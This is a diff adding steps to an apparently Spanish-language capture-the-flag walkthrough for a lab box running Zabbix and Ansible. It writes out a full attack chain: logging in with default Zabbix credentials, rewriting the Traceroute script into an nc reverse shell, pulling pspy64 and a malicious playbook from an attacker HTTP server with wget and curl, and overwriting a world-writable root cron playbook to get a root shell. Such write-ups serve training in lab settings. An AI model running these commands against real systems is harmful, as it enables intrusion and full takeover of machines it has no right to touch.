@@ -15,6 +15,48 @@ hacer un playbook.yml (malicioso para otra revershell)
   - name: RShell
     command: nc 10.10.0.158 9090 -e /bin/bash
 
+//Exploitation
+Tras buscar credenciales por defecto de Zabbix, se entra como administrador.
+
+En Monitoring → Hosts el menú del host muestra SCRIPTS: Detect operating system, Ping y Traceroute.
+
+En Alerts → Scripts se ve el listado. Traceroute es de tipo Manual host action y el comando original es:
+/usr/bin/traceroute {HOST.CONN}
+Como admin se puede editar. Se cambia el comando por un reverse shell, por ejemplo:
+nc <ip-address> 8989 -e /bin/bash
+Se guarda con Update. Antes de lanzarlo hay que tener el listener:
+nc -lnvp 8989
+Luego, en el host, se ejecuta el script Traceroute envenenado. Llega una shell como zabbix. Si Zabbix corta el script por timeout, se vuelve a lanzar.
+Shell stabilization
+En el target:
+python3 -c "import pty;pty.spawn('/bin/bash')"
+export TERM=xterm-color
+Ctrl+Z en el atacante, después:
+stty raw -echo; fg
+reset
+//Privilege escalation
+sudo -l no da nada. Se usa pspy64.
+
+En el atacante, en el directorio del binario:
+python3 -m http.server 8000
+En el target, /tmp (permisos abiertos):
+cd /tmp
+wget http://<attacker>:8000/pspy64
+chmod +x pspy64
+./pspy64
+pspy muestra un cron como UID=0 ejecutando:
+/usr/bin/python3 /usr/bin/ansible-playbook /opt/playbooks/playbook.yml
+Permisos del playbook:
+-rwxrwxrw- 1 root root ... /opt/playbooks/playbook.yml
+El usuario zabbix puede escribirlo. Se arma un playbook malicioso (reverse shell con nc al puerto 9090) en este caso ya lo hicimos antes al inicio asi que vamos a descargarlo 
+curl -O http://TU_IP:8080/playbook.yml
+se sirve por HTTP y se descarga en el target. Listener:
+rlwrap nc -lnvp 9090
+
+Hacemos lo siguiente para que ya nos vote la revershell para el utitmo paso
+cp playbook.yml /opt/playbooks/playbook.yml
+
+// Con esto recibiremos en unos segundos despues la conexion en la otra terminal y listo aqui dejo los paso que hice en la consola 
 
 
 zabbix@syswatch:/$ cd /tmp
@@ -65,7 +107,7 @@ drwxr-xr-x 1 root root 4096 Sep  8 21:29 ..
 drwxr-xr-x 3 root root 4096 Sep  8 21:30 .ansible
 -rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
 -rw-r--r-- 1 root root  161 Jul  9  2019 .profile
--rw-r--r-- 1 root root    0 Oct 29  2023 ETSCTF_c876beb797925fb89d405cede07f05aa
+-rw-r--r-- 1 root root    0 Oct 29  2023 BANDERA ETSCTF
 ls -la ETSCTF
 id
 uid=0(root) gid=0(root) groups=0(root)
@@ -84,4 +126,4 @@ drwxr-xr-x 1 root   root    4096 Oct 29  2023 ..
 -rw-r--r-- 1 ETSCTF nogroup  220 Mar 27  2022 .bash_logout
 -rw-r--r-- 1 ETSCTF nogroup 3526 Mar 27  2022 .bashrc
 -rw-r--r-- 1 ETSCTF nogroup  807 Mar 27  2022 .profile
--rw-r--r-- 1 root   root       0 Oct 29  2023 ETSCTF_d807600b189bce36ddab2b349aa6b307
+-rw-r--r-- 1 root   root       0 Oct 29  2023 BANDERA ETSCTF
